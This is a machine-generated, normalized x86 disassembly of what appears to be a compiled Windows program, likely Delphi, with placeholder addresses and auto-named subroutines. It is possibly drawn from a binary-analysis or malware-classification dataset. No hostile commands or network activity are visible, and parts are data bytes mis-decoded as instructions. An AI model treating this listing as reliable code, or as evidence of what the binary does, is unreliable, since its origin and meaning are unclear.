add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
test [ esi ] al
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45120040 ] al
dec ecx
dec edi
push ebx
push ebx
dec esp
inc ecx
popad
imul ebp [ fs : esi + 0x67 ] 0x4579654b
jb r-xdata
rol [ esp + eax * 4 ] 0x46
add [ eax ] al
add [ eax ] al
mov esi [ ebx + 0x34 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_4260b8
xor eax eax
push ebp
push sub_46859e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
call sub_404050
mov ebx [ ebp + 0x14 ]
mov esi [ ebx + 0x34 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
rol [ ebp - 0x9bffba ] 0x30
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ esi ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax [ ebp - 0x8 ]
call sub_404310
mov ebx eax
lea eax [ ebp - 0xc ]
mov ecx r-xdata
mov edx [ ebp - 0x8 ]
call sub_40435c
mov eax [ ebp - 0xc ]
call sub_404510
mov edx eax
lea ecx [ ebx + 0x1 ]
mov eax [ ebp + 0x8 ]
call sub_408698
mov [ ebp - 0x4 ] ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4685a5
mov eax [ rw-data ]
call sub_4260c0
retn
lea edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
inc esp
popad
je r-xdata
enter 0x4684 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_4685d3
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_4686d5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_4260b8
xor eax eax
push ebp
push sub_4686ab
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4649ac
mov ebx eax
lea eax [ ebp - 0x4 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
lea edx [ ebp - 0x10 ]
call sub_408820
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405b50
mov eax [ ebp - 0x14 ]
xor ecx ecx
pop edx
call sub_408d10
mov esi [ ebx + 0xc ]
mov eax esi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov esi [ ebx + 0xc ]
mov eax esi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x60 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4686b2
mov eax [ rw-data ]
call sub_4260c0
retn
mov eax esi
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
sub_4686e4
push ebx
call sub_4637f4
test al al
jne r-xdata
call sub_4649bc
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
setg bl
mov dl 0x1
mov eax [ r-xdata ]
call sub_426030
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_426030
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_426030
mov [ rw-data ] eax
xor ebx ebx
jmp r-xdata
mov eax ebx
pop ebx
retn
sub_46876c
push ecx
mov [ esp ] al
xor eax eax
test [ esp ] 0x1
je r-xdata
test [ esp ] 0x2
je r-xdata
or eax 0x1
test [ esp ] 0x4
je r-xdata
or eax 0x2
pop edx
retn
or eax 0x4
sub_468790
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov eax [ rw-data ]
call sub_4260b8
xor eax eax
push ebp
push sub_4688cf
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x1
xor eax eax
push ebp
push j_sub_40371c#2
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
mov edi eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
mov ebx eax
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_469bac
mov edi eax
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
call sub_403ab4
jmp r-xdata
mov eax ebx
call sub_4649ac
mov ebx eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
mov esi eax
mov eax [ ebx + 0xc ]
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov eax [ ebx + 0xc ]
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov eax [ ebx + 0xc ]
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov [ ebp - 0x5 ] al
cmp [ ebp + 0x8 ] 0x0
jle r-xdata
mov eax [ ebx + 0xc ]
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov [ ebp - 0x5 ] al
xor eax eax
mov [ ebp + 0x8 ] eax
mov eax [ ebx + 0x10 ]
cmp esi [ eax + 0x14 ]
jle r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x8 ] 0x0
jle r-xdata
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4260c0
retn
sub_468898
call sub_403a84
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x8 ] 0x0
jle r-xdata
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4260c0
retn
sub_4688e0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_414850
mov edi esi
lea eax [ edi + 0x4 ]
mov edx [ ebx + 0x4 ]
call sub_4040a4
lea eax [ edi + 0x8 ]
mov edx [ ebx + 0x8 ]
call sub_4040a4
lea eax [ edi + 0xc ]
mov edx [ ebx + 0xc ]
call sub_4040a4
mov al [ ebx + 0x10 ]
mov [ edi + 0x10 ] al
mov al [ ebx + 0x11 ]
mov [ edi + 0x11 ] al
mov al [ ebx + 0x18 ]
mov [ edi + 0x18 ] al
mov eax [ ebx + 0x14 ]
mov [ edi + 0x14 ] eax
lea eax [ edi + 0x1c ]
mov edx [ ebx + 0x1c ]
call sub_4040a4
lea eax [ edi + 0x20 ]
mov edx [ ebx + 0x20 ]
call sub_4040a4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_468958
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_45de14
mov [ esi + 0x70 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ esi + 0x6c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_4689a0
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
cmp [ esi + 0x68 ] 0x0
je r-xdata
mov eax [ esi + 0x6c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_45deac
test bl bl
jle r-xdata
lea eax [ esi + 0x68 ]
call sub_40d19c
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_4689e0
push ebx
push esi
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_468f74
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0x34 ] ebx
lea eax [ esi + 0x8 ]
mov edx [ ebx + 0x6c ]
mov edx [ edx + 0x4 ]
call sub_4040a4
lea eax [ esi + 0xc ]
mov edx [ ebx + 0x6c ]
mov edx [ edx + 0x8 ]
call sub_4040a4
lea eax [ esi + 0x10 ]
mov edx [ ebx + 0x6c ]
mov edx [ edx + 0xc ]
call sub_4040a4
mov eax [ ebx + 0x6c ]
mov eax [ eax + 0x14 ]
mov [ esi + 0x14 ] eax
mov eax [ ebx + 0x6c ]
mov al [ eax + 0x18 ]
mov [ esi + 0x18 ] al
lea eax [ esi + 0x1c ]
mov edx [ ebx + 0x6c ]
mov edx [ edx + 0x1c ]
call sub_4040a4
lea eax [ esi + 0x20 ]
mov edx [ ebx + 0x6c ]
mov edx [ edx + 0x20 ]
call sub_4040a4
cmp [ ebx + 0x8a ] 0x0
je r-xdata
mov [ esi + 0x29 ] 0x0
mov [ esi + 0x29 ] 0x1
jmp r-xdata
mov [ esi + 0x28 ] 0x0
mov [ esi + 0x28 ] 0x1
jmp r-xdata
cmp [ ebx + 0x7a ] 0x0
je r-xdata
mov eax [ ebx + 0x6c ]
mov al [ eax + 0x10 ]
mov [ esi + 0x4 ] al
mov eax [ ebx + 0x6c ]
mov al [ eax + 0x11 ]
mov [ esi + 0x5 ] al
mov dl 0x1
mov eax [ ebx + 0x68 ]
call sub_469074
mov [ ebx + 0x70 ] 0x1
pop esi
pop ebx
retn
sub_468a98
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x70 ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_468bb4
mov [ esp ] eax
mov eax [ esp ]
mov [ eax + 0x84 ] 0x1
mov eax [ esp ]
mov edx [ eax ]
call [ edx + 0x4c ]
mov eax [ esp ]
mov eax [ eax + 0x68 ]
mov edx esi
call sub_45f4d0
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
xor ebx ebx
mov eax esp
call sub_40d19c
mov eax [ esp ]
mov edx [ ebx + 0x6c ]
mov [ eax + 0x7c ] edx
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_469614
mov edx [ esp ]
mov [ edx + 0x80 ] eax
mov eax [ esp ]
mov edx [ ebx + 0x68 ]
mov [ eax + 0x78 ] edx
mov ebx [ esp ]
jmp r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
sub_468b20
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404500
xor eax eax
push ebp
push sub_468b66
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x7a ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468b6d
lea eax [ ebp - 0x4 ]
call sub_404050
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x7c ]
call [ ebx + 0x78 ]
sub_468bb4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_462bd0
mov [ esi + 0x84 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ esi + 0x7c ] eax
mov [ esi + 0xa0 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_468c08
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
lea eax [ esi + 0x80 ]
call sub_40d19c
cmp [ esi + 0x84 ] 0x0
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_462dd8
test bl bl
jle r-xdata
lea eax [ esi + 0x78 ]
call sub_40d19c
mov eax [ esi + 0x7c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx - 0x4 ]
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_468c54
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4629d8
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
xor eax eax
push ebp
push j_sub_403848
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_468dc4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xb0 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x14
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x74 ]
sub_468caa
add [ eax ] eax
add [ eax ] al
mov [ eax - 0x7349ffba ] al
inc esi
add [ ebx - 0x477f03bb ] cl
mov al 0x0
add [ eax ] al
add [ ebp + 0x5 ] dh
call sub_403a30
call sub_403a84
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xb0 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x14
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x74 ]
sub_468d60
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_468da7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_45e29c
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x78 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x80 ]
call sub_469700
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_468dc4
push ebx
push esi
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_468f74
mov esi eax
mov [ ebx + 0x78 ] esi
mov [ esi + 0x34 ] ebx
lea eax [ esi + 0x8 ]
mov edx [ ebx + 0x7c ]
mov edx [ edx + 0x4 ]
call sub_4040a4
lea eax [ esi + 0xc ]
mov edx [ ebx + 0x7c ]
mov edx [ edx + 0x8 ]
call sub_4040a4
lea eax [ esi + 0x10 ]
mov edx [ ebx + 0x7c ]
mov edx [ edx + 0xc ]
call sub_4040a4
mov eax [ ebx + 0x7c ]
mov eax [ eax + 0x14 ]
mov [ esi + 0x14 ] eax
mov eax [ ebx + 0x7c ]
mov al [ eax + 0x18 ]
mov [ esi + 0x18 ] al
lea eax [ esi + 0x1c ]
mov edx [ ebx + 0x7c ]
mov edx [ edx + 0x1c ]
call sub_4040a4
lea eax [ esi + 0x20 ]
mov edx [ ebx + 0x7c ]
mov edx [ edx + 0x20 ]
call sub_4040a4
cmp [ ebx + 0x9a ] 0x0
je r-xdata
mov [ esi + 0x29 ] 0x0
mov [ esi + 0x29 ] 0x1
jmp r-xdata
mov [ esi + 0x28 ] 0x0
mov [ esi + 0x28 ] 0x1
jmp r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
mov eax [ ebx + 0x7c ]
mov al [ eax + 0x10 ]
mov [ esi + 0x4 ] al
mov eax [ ebx + 0x7c ]
mov al [ eax + 0x11 ]
mov [ esi + 0x5 ] al
xor edx edx
mov eax [ ebx + 0x78 ]
call sub_469074
pop esi
pop ebx
retn
sub_468e7c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404500
xor eax eax
push ebp
push sub_468ecb
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x8a ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468ed2
lea eax [ ebp - 0x4 ]
call sub_404050
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_468f18
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x80 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_469614
mov esi eax
mov [ ebx + 0x80 ] esi
mov eax [ ebx + 0x78 ]
mov [ esi + 0x10 ] eax
mov eax [ ebx + 0x68 ]
mov edx [ eax + 0xc ]
mov ecx [ ebx + 0x78 ]
mov eax esi
call sub_4698f8
sub_468f74
push ebp
mov ebp esp
push 0x0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_469004
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_403264
cmp [ rw-data ] 0x0
jg r-xdata
add esp 0xfffffff0
call sub_4035a0
inc [ rw-data ]
mov al [ r-xdata ]
mov [ esi + 0x18 ] al
mov [ esi + 0x5 ] 0x0
mov [ esi + 0x2c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46900b
lea eax [ ebp - 0x4 ]
call sub_404050
retn
call sub_4686e4
test al al
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
sub_469029
add [ eax ] al
add [ ebx + 0x56 ] dl
call sub_403608
mov ebx edx
mov esi eax
mov eax esi
call sub_469058
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403284
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_469058
push ebx
mov ebx eax
mov eax [ ebx + 0x24 ]
test eax eax
je r-xdata
pop ebx
retn
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
xor eax eax
mov [ ebx + 0x24 ] eax
sub_469074
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] dl
mov edi eax
xor eax eax
push ebp
push sub_4692c8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
call sub_469058
cmp [ edi + 0x5 ] 0x0
jne r-xdata
mov eax edi
call sub_469370
mov esi eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
mov ebx eax
mov [ edi + 0x24 ] ebx
test ebx ebx
jne r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
push r-xdata
mov eax [ edi + 0x24 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0x8
push edi
mov eax [ edi + 0x24 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0x8
mov eax [ edi + 0x24 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
cmp [ edi + 0x8 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
mov [ edi + 0x5 ] 0x1
mov [ edi + 0x5 ] 0x2
jmp r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
mov eax edi
call sub_469548
test al al
jne r-xdata
cmp [ edi + 0x10 ] 0x0
je r-xdata
mov eax edi
call sub_469584
test al al
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
cmp [ edi + 0x28 ] 0x0
je r-xdata
mov eax edi
call sub_4695c0
test al al
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
cmp [ edi + 0x20 ] 0x0
je r-xdata
push r-xdata
mov eax [ edi + 0x24 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0x8
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
push r-xdata
mov eax [ edi + 0x24 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0x8
mov esi eax
mov eax [ edi + 0x20 ]
call sub_404510
call sub_408854
mov ebx eax
push ebx
mov eax [ edi + 0x24 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0x8
mov esi eax
mov eax ebx
call sub_408880
jmp r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x18 ]
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
test esi esi
jg r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
mov cl [ edi + 0x29 ]
mov dl [ edi + 0x18 ]
mov eax edi
call sub_46930c
cmp [ edi + 0x8 ] 0x0
je r-xdata
push 0x4
lea eax [ edi + 0x2c ]
push eax
mov eax [ edi + 0x24 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0xc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4692cf
lea eax [ ebp - 0x18 ]
mov edx 0x5
call sub_404074
retn
mov eax [ edi + 0x8 ]
call sub_404510
call sub_408854
mov ebx eax
push ebx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
push eax
mov eax [ edi + 0x24 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0x8
mov eax ebx
call sub_408880
sub_46930c
push ebx
push esi
push ecx
mov [ esp ] dl
mov ebx eax
mov esi [ ebx + 0x24 ]
test esi esi
je r-xdata
pop edx
pop esi
pop ebx
retn
test cl cl
je r-xdata
push 0x0
mov al [ esp + 0x4 ]
call sub_46876c
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0xc
push sub_468790
mov al [ esp + 0x4 ]
call sub_46876c
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0xc
jmp r-xdata
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x24 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0x8
sub_469370
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
xor edx edx
push ebp
push sub_46953a
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ eax + 0x5 ] 0x0
jne r-xdata
mov dl [ eax + 0x4 ]
sub dl 0x1
jb r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
mov al [ eax + 0x5 ]
dec al
je r-xdata
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
dec al
je r-xdata
mov al [ eax + 0x5 ]
dec al
je r-xdata
dec dl
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469541
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404074
retn
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
dec al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
dec al
je r-xdata
mov al [ eax + 0x5 ]
dec al
je r-xdata
dec dl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
dec al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
dec al
je r-xdata
mov al [ eax + 0x5 ]
dec al
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
dec al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
dec al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
sub_469548
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x8 ]
call sub_404510
call sub_408854
mov esi eax
push 0x0
push esi
mov eax [ ebx + 0x24 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0xc
test eax eax
jg r-xdata
mov bl 0x1
xor ebx ebx
jmp r-xdata
mov eax esi
call sub_408880
mov eax ebx
pop esi
pop ebx
retn
sub_469584
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_404510
call sub_408854
mov esi eax
push 0x1
push esi
mov eax [ ebx + 0x24 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0xc
test eax eax
jg r-xdata
mov bl 0x1
xor ebx ebx
jmp r-xdata
mov eax esi
call sub_408880
mov eax ebx
pop esi
pop ebx
retn
sub_4695c0
push ebx
push esi
push edi
mov edi eax
mov bl 0x1
mov eax [ edi + 0x10 ]
call sub_404510
call sub_408854
mov esi eax
push 0x1
push esi
mov eax [ edi + 0x24 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0xc
test eax eax
jg r-xdata
mov eax [ edi + 0x24 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
test eax eax
jg r-xdata
xor ebx ebx
jmp r-xdata
mov eax esi
call sub_408880
mov eax ebx
pop edi
pop esi
pop ebx
retn
xor ebx ebx
sub_469614
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403264
mov [ edi + 0xc ] esi
xor eax eax
mov [ edi + 0x10 ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_469658
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403284
test bl bl
jle r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
mov eax [ esi + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
xor eax eax
mov [ esi + 0x14 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_4696a4
push edx
mov eax [ eax + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0x8
mov edx eax
cmp edx 0x6
ja r-xdata
retn
jmp [ edx * 4 + jump_table_4696c3 ]
xor eax eax
retn
mov eax 0x3
retn
mov eax 0x2
retn
mov eax 0x6
retn
mov eax 0x5
retn
mov eax 0x1
sub_469700
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
